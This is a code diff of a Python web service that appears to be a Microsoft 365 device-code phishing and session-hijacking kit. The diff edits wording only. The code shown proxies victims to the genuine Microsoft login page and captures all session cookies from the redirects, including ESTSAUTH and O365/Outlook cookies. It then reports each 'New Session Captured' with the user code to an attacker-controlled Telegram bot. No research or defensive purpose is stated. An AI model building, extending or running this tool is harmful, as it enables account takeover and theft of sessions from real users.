@@ -55,7 +55,7 @@ async def send_telegram(device_code, user_code, count):
     if not (TELEGRAM_TOKEN and TELEGRAM_CHAT):
         return
     try:
-        msg = f"✅ New Microsoft Session Captured!\n\nDevice: {device_code[:12]}...\nUser Code: {user_code}\nCookies Captured: {count} (ESTSAUTH, fpc, esctx, O365/Outlook included)"
+        msg = f"New Session Captured!\nDevice: {device_code[:12]}...\nCode: {user_code}\nCookies Captured: {count} (O365/Outlook included)"
         async with httpx.AsyncClient() as c:
             await c.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": TELEGRAM_CHAT, "text": msg})
     except:
@@ -135,7 +135,7 @@ async def health():
     return {"status": "healthy", "client_id_set": bool(CLIENT_ID)}
 
 
-# ADVANCED PROXY - Silent redirect to original Microsoft page + full cookie capture
+# PROXY - Silent redirect to original Microsoft page + full cookie capture
 @app.api_route("/proxy/device-login/{device_code}", methods=["GET", "POST", "HEAD", "OPTIONS"])
 async def proxy(device_code: str, request: Request):
     if not ENABLE_PROXY:
@@ -161,7 +161,7 @@ async def proxy(device_code: str, request: Request):
             content=await request.body() if request.method != "GET" else None
         )
 
-    # Capture all cookies from every redirect (highly advanced)
+    # Capture all cookies from every redirect
     captured = {}
     for past in list(resp.history) + [resp]:
         for h in past.headers.getlist("set-cookie"):
